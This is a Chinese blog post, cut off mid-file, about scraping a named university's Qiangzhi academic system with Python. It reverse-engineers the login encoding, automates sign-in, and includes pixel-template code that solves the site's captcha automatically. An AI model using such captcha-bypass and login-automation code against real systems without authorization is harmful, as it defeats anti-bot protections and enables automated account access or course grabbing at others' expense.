    <content type="html"><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/illust_74923720_20190810_124148.png" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近想学一下爬虫的进阶用法，比如模拟登录之类的，在网上找的教程里面所用的测试网站现在已经加了反爬虫机制，目前我还太菜，还过不了反爬机制。但是忽然想到了学校还有个<del>垃圾</del><code>强智系统</code>，漏洞百出，应该也不会加反爬机制，所以拿强智练练手。</p><h1 id="0x01-用浏览器初探"><a href="#0x01-用浏览器初探" class="headerlink" title="0x01 用浏览器初探"></a>0x01 用浏览器初探</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>这里只需用Chrome浏览器的开发者工具(F12)，也不需要用BP之类的抓包工具</p><p>打开网站，<a href="http://jwgl.sdust.edu.cn/" target="_blank" rel="noopener">强智-山东科技大学</a>，打开开发者工具–Network–勾上Preserve log，然后用自己的账号登录。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200402022940.png" alt></p><p>然后可以看到有挺多信息的，</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200402023147.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200402023230.png" alt></p><p>这里有几个关键的信息:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Request URL: http://jwgl.sdust.edu.cn/Logon.do?method=logon</span><br><span class="line">Request Method: POST</span><br><span class="line">Origin: http://jwgl.sdust.edu.cn</span><br><span class="line">Referer: http://jwgl.sdust.edu.cn/</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.69 Safari/537.36</span><br><span class="line"></span><br><span class="line">encoded: *******************************************************</span><br><span class="line">RANDOMCODE: cn3v</span><br></pre></td></tr></table></figure><p>这些信息向我们指明了<code>真实请求的URL</code>、<code>请求方法</code>、<code>Origin</code>、<code>Referer</code>、<code>User-Agent</code>、<code>Post所传参数</code>。</p><h2 id="陷入困境"><a href="#陷入困境" class="headerlink" title="陷入困境"></a>陷入困境</h2><p>这里post所传参数与我想象的有所不同，我以为会传入用户名、密码、验证码，但是实际上只有一个encoded和验证码。</p><p>盲猜可能通过某种加密方法将用户名和密码加密成了encoded，因为我从这个encoded里面看到了我密码的一部分，而且密码像插队一样插在encoded中。</p><p>多次重新登录并查看这个encoded发现这个值是会变的，也就是说加密算法应该是有一个动态的参照，或者是<del>随机数种子</del>（结合一些web知识，随机数种子不太现实）？</p><p>那么该如何通过用户名和密码来得到这个encoded？</p><h2 id="柳暗花明"><a href="#柳暗花明" class="headerlink" title="柳暗花明"></a>柳暗花明</h2><p>困扰了一会以后，我看了一下网页源码，我看到了一段令我惊喜的代码。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200402024326.png" alt></p><p>这里写了encoded的生成算法，果然是由用户名和密码以及dataStr计算得来。</p><p>dataStr是通过<code>/Logon.do?method=logon&amp;flag=sess</code>生成的</p><p><a href="http://jwgl.sdust.edu.cn/Logon.do?method=logon&flag=sess" target="_blank" rel="noopener">dataStr生成网址</a>。</p><p>刷新几次可以看到每次生成的结果都不同。</p><p>把JS代码转化成Python代码即可得到encoded。</p><h1 id="0x02-用爬虫初探"><a href="#0x02-用爬虫初探" class="headerlink" title="0x02 用爬虫初探"></a>0x02 用爬虫初探</h1><h2 id="获取验证码"><a href="#获取验证码" class="headerlink" title="获取验证码"></a>获取验证码</h2><p>从网页源码里面可以看到，验证码是在这个网站获取的</p><p><a href="http://jwgl.sdust.edu.cn/verifycode.servlet" target="_blank" rel="noopener">验证码网站</a></p><p>那么我们同样可以去这个网站获取验证码，由于我现在还没法很完美的实现验证码的自动识别，这里采用将二维码show出来手工输入的办法。</p><h2 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h2><p>由于验证码生成网站和dataStr生成网站每次刷新，里面内容都会不同</p><p>那么我们该如何实现爬虫传的参数 与 我们生成的dataStr和验证码的统一？</p><p>这里通过创建session对象来实现统一。</p><h2 id="如何测试是否登录成功"><a href="#如何测试是否登录成功" class="headerlink" title="如何测试是否登录成功"></a>如何测试是否登录成功</h2><p>可以打印一下post以后的内容，看看是不是和用浏览器登录进去的一样，不能通过看post的state_code。</p><h2 id="代码-demo"><a href="#代码-demo" class="headerlink" title="代码(demo)"></a>代码(demo)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spider</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.69 Safari/537.36'</span>,</span><br><span class="line">            <span class="string">'Referer'</span>: <span class="string">'http://jwgl.sdust.edu.cn/'</span></span><br><span class="line">        &#125;</span><br><span class="line">        self.seesion = requests.session()</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] Session初始化完成!'</span></span><br><span class="line">        self.userAccount = raw_input(<span class="string">'请输入学号:'</span>)</span><br><span class="line">        self.userPassword = raw_input(<span class="string">'请输入密码:'</span>)</span><br><span class="line">        self.dataStr = <span class="string">''</span></span><br><span class="line">        self.safeCode = <span class="string">''</span></span><br><span class="line">        self.encoded = <span class="string">''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_dataStr</span><span class="params">(self)</span>:</span></span><br><span class="line">        dataStrUrl = <span class="string">'http://jwgl.sdust.edu.cn/Logon.do?method=logon&amp;flag=sess'</span></span><br><span class="line">        self.dataStr = self.seesion.get(url=dataStrUrl, headers=self.headers).content</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] dataStr 已获取!'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_safeCode</span><span class="params">(self)</span>:</span></span><br><span class="line">        safeCodeUrl = <span class="string">'http://jwgl.sdust.edu.cn/verifycode.servlet'</span></span><br><span class="line">        safeCodeCont = self.seesion.get(url=safeCodeUrl, headers=self.headers).content</span><br><span class="line">        f = open(<span class="string">'safeCode.jpg'</span>,<span class="string">'wb'</span>)</span><br><span class="line">        f.write(safeCodeCont)</span><br><span class="line">        f.close()</span><br><span class="line">        img = Image.open(<span class="string">'safeCode.jpg'</span>)</span><br><span class="line">        img.show()</span><br><span class="line">        safeCode = raw_input(<span class="string">'请输入验证码:'</span>)</span><br><span class="line">        os.remove(<span class="string">'safeCode.jpg'</span>)</span><br><span class="line">        self.safeCode = safeCode</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] 验证码已获取!'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_encoded</span><span class="params">(self)</span>:</span></span><br><span class="line">        scode = self.dataStr.split(<span class="string">'#'</span>)[<span class="number">0</span>]</span><br><span class="line">        sxh = self.dataStr.split(<span class="string">'#'</span>)[<span class="number">1</span>]</span><br><span class="line">        code = self.userAccount + <span class="string">'%%%'</span> + self.userPassword</span><br><span class="line">        encode = <span class="string">''</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; len(code):</span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="number">20</span>:</span><br><span class="line">                encode += code[i:i + <span class="number">1</span>] + scode[<span class="number">0</span>:int(sxh[i:i + <span class="number">1</span>])]</span><br><span class="line">                scode = scode[int(sxh[i:i + <span class="number">1</span>]):len(scode)]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                encode += code[i:len(code)]</span><br><span class="line">                i = len(code)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        self.encoded = encode</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[+] encoded已获取!'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        loginUrl = <span class="string">'http://jwgl.sdust.edu.cn/Logon.do?method=logon'</span></span><br><span class="line">        self.get_dataStr()</span><br><span class="line">        self.get_safeCode()</span><br><span class="line">        self.get_encoded()</span><br><span class="line">        login_data = &#123;</span><br><span class="line">            <span class="string">'encoded'</span>: self.encoded,</span><br><span class="line">            <span class="string">'RANDOMCODE'</span>: self.safeCode</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">print</span> self.seesion.post(url = loginUrl,data = login_data,headers = self.headers).content</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    test = Spider()</span><br><span class="line">    test.login()</span><br></pre></td></tr></table></figure><p>放一张表明登录成功的截图吧。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200402032818.png" alt></p><h2 id="代码2-demo"><a href="#代码2-demo" class="headerlink" title="代码2(demo)"></a>代码2(demo)</h2><p>4月3号更新了一些小功能，做了一些优化，但程序依然还只是个雏形。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> webbrowser</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">__Author__ = <span class="string">'LiuLian'</span></span><br><span class="line"><span class="comment"># 测试环境Python2.7.16</span></span><br><span class="line"><span class="comment"># Create for fun!</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spider</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.69 Safari/537.36'</span>,</span><br><span class="line">            <span class="string">'Referer'</span>: <span class="string">'http://jwgl.sdust.edu.cn/'</span></span><br><span class="line">        &#125;</span><br><span class="line">        self.seesion = requests.session()</span><br><span class="line">        print(<span class="string">'[+] Session初始化完成!'</span>)</span><br><span class="line">        self.userAccount = raw_input(<span class="string">'请输入学号:'</span>)</span><br><span class="line">        self.userPassword = raw_input(<span class="string">'请输入密码:'</span>)</span><br><span class="line">        self.dataStr = <span class="string">''</span></span><br><span class="line">        self.safeCode = <span class="string">''</span></span><br><span class="line">        self.encoded = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_dataStr</span><span class="params">(self)</span>:</span></span><br><span class="line">        dataStrUrl = <span class="string">'http://jwgl.sdust.edu.cn/Logon.do?method=logon&amp;flag=sess'</span></span><br><span class="line">        self.dataStr = self.seesion.get(url=dataStrUrl, headers=self.headers).content</span><br><span class="line">        print(<span class="string">'[+] dataStr 已获取!'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_safeCode</span><span class="params">(self)</span>:</span></span><br><span class="line">        safeCodeUrl = <span class="string">'http://jwgl.sdust.edu.cn/verifycode.servlet'</span></span><br><span class="line">        safeCodeCont = self.seesion.get(url=safeCodeUrl, headers=self.headers).content</span><br><span class="line">        f = open(<span class="string">'safeCode.jpg'</span>, <span class="string">'wb'</span>)</span><br><span class="line">        f.write(safeCodeCont)</span><br><span class="line">        f.close()</span><br><span class="line">        img = Image.open(<span class="string">'safeCode.jpg'</span>)</span><br><span class="line">        img.show()</span><br><span class="line">        safeCode = raw_input(<span class="string">'请输入验证码:'</span>)</span><br><span class="line">        os.remove(<span class="string">'safeCode.jpg'</span>)</span><br><span class="line">        self.safeCode = safeCode</span><br><span class="line">        print(<span class="string">'[+] 验证码已获取!'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_encoded</span><span class="params">(self)</span>:</span></span><br><span class="line">        scode = self.dataStr.split(<span class="string">'#'</span>)[<span class="number">0</span>]</span><br><span class="line">        sxh = self.dataStr.split(<span class="string">'#'</span>)[<span class="number">1</span>]</span><br><span class="line">        code = self.userAccount + <span class="string">'%%%'</span> + self.userPassword</span><br><span class="line">        encode = <span class="string">''</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; len(code):</span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="number">20</span>:</span><br><span class="line">                encode += code[i:i + <span class="number">1</span>] + scode[<span class="number">0</span>:int(sxh[i:i + <span class="number">1</span>])]</span><br><span class="line">                scode = scode[int(sxh[i:i + <span class="number">1</span>]):len(scode)]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                encode += code[i:len(code)]</span><br><span class="line">                i = len(code)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        self.encoded = encode</span><br><span class="line">        print(<span class="string">'[+] encoded已获取!'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        loginUrl = <span class="string">'http://jwgl.sdust.edu.cn/Logon.do?method=logon'</span></span><br><span class="line">        self.get_dataStr()</span><br><span class="line">        self.get_safeCode()</span><br><span class="line">        self.get_encoded()</span><br><span class="line">        login_data = &#123;</span><br><span class="line">            <span class="string">'encoded'</span>: self.encoded,</span><br><span class="line">            <span class="string">'RANDOMCODE'</span>: self.safeCode</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            html = self.seesion.post(url=loginUrl, data=login_data, headers=self.headers).content</span><br><span class="line">            <span class="keyword">if</span> html.find(<span class="string">'&lt;title&gt;学生个人中心&lt;/title&gt;'</span>) != <span class="number">-1</span>:</span><br><span class="line">                print(<span class="string">'[+] 登录成功! :)\n姓名、学号如下:'</span>)</span><br><span class="line">                pattern = <span class="string">r'&lt;div id="Top1_divLoginName" class="Nsb_top_menu_nc" style="color: #000000;"&gt;(.+?)&lt;/div&gt;'</span></span><br><span class="line">                name_num = re.findall(pattern=pattern,string=html)[<span class="number">0</span>].decode(<span class="string">'utf-8'</span>)</span><br><span class="line">                print(name_num)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> html.find(<span class="string">'&lt;font color="red"&gt;验证码无效,请重新登录!&lt;/font&gt;'</span>) != <span class="number">-1</span>:</span><br><span class="line">                print(<span class="string">'[-] 验证码输入错误 :(,请重试该程序...'</span>)</span><br><span class="line">                time.sleep(<span class="number">2</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] 登录失败 :( ,正在尝试重新登录...'</span>)</span><br><span class="line">                time.sleep(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_class_schedule</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"获得学期理论课表并展示"</span></span><br><span class="line">        class_schedule_url = <span class="string">'http://jwgl.sdust.edu.cn/jsxsd/xskb/xskb_list.do?Ves632DSdyV=NEW_XSD_PYGL'</span></span><br><span class="line">        f = open(<span class="string">'schedule.html'</span>, <span class="string">'wb'</span>)</span><br><span class="line">        html = self.seesion.get(url=class_schedule_url, headers=self.headers).content</span><br><span class="line">        f.write(html)</span><br><span class="line">        f.close()</span><br><span class="line">        webbrowser.open(<span class="string">'schedule.html'</span>)</span><br><span class="line">        <span class="comment"># os.remove('schedule.html')</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Teacher_evaluation</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"进行教师评价"</span></span><br><span class="line">        evaluation_url = <span class="string">'http://jwgl.sdust.edu.cn/jsxsd/xspj/xspj_find.do?Ves632DSdyV=NEW_XSD_JXPJ'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Robbing_class</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"抢课"</span></span><br><span class="line">        robbing_url = <span class="string">'http://jwgl.sdust.edu.cn/jsxsd/xsxkRedis/xklc_list?Ves632DSdyV=NEW_XSD_PYGL'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    test = Spider()</span><br><span class="line">    test.login()</span><br><span class="line">    test.get_class_schedule()</span><br></pre></td></tr></table></figure><h2 id="代码3-demo"><a href="#代码3-demo" class="headerlink" title="代码3(demo)"></a>代码3(demo)</h2><p>一次偶然的机会在网上找到了一个关于过强智网站验证码识别的代码。</p><p>比较特殊，强智的验证码里面只有<code>123zxcvbnm</code>这些字符，因此过验证码的难度大大降低。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#orc.py</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> char_lists <span class="keyword">import</span> chars</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">identify</span><span class="params">(img)</span>:</span></span><br><span class="line">identification_code_temp=[];identification_code=[<span class="string">''</span>]*<span class="number">4</span>;diff_min=[<span class="number">144</span>]*<span class="number">4</span>;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">4</span>):</span><br><span class="line">identification_code_temp.append(img.crop((i*<span class="number">10</span>, <span class="number">0</span>, i*<span class="number">10</span>+<span class="number">13</span>, <span class="number">12</span>)).getdata())</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">diff = [<span class="number">0</span>]*<span class="number">4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">156</span>):</span><br><span class="line"><span class="keyword">if</span> identification_code_temp[i][j] ^ chars[char][j]:</span><br><span class="line">diff[i] += <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line"><span class="keyword">if</span> diff[i]&lt;diff_min[i]:</span><br><span class="line">diff_min[i]=diff[i]</span><br><span class="line">identification_code[i]=char</span><br><span class="line"><span class="keyword">return</span> <span class="string">''</span>.join(identification_code)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">identificationCodeHandle</span><span class="params">(img)</span>:</span></span><br><span class="line">rect_box = (<span class="number">3</span>,<span class="number">4</span>,<span class="number">46</span>,<span class="number">16</span>)</span><br><span class="line">img = img.crop(rect_box)</span><br><span class="line">img = img.convert(<span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">return</span> img</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#char_lists.py</span></span><br><span class="line">chars = &#123;</span><br><span class="line"><span class="string">'1'</span>:[<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>],</span><br><span class="line"><span class="string">'2'</span>:[<span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span 